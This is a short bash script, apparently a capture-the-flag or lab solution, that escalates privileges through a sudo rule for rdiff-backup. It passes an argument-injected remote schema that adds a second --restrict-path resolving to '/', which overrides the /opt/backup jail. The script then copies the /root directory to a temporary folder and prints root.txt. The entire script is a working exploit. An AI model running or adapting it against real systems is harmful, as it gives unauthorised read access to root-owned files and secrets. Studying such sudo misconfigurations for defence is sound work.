#!/usr/bin/env bash
# sudo wildcard -> rdiff-backup --restrict-path override -> read /root.
# Run as the low-priv user (owen). Do NOT prefix this with sudo.
# Usage: ./privesc_rdiff.sh [out_dir]
set -euo pipefail

OUT="${1:-/tmp/root_backup}"

# The empty host part of /::/root is what substitutes for %s,
# so the injected --restrict-path resolves to "/" and overrides
# the /opt/backup jail (rdiff-backup honours the last occurrence).
rdiff-backup --remote-schema \
  "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup /::/root "${OUT}"

echo "[+] mirrored /root to ${OUT}"
ls -la "${OUT}"
cat "${OUT}/root.txt"
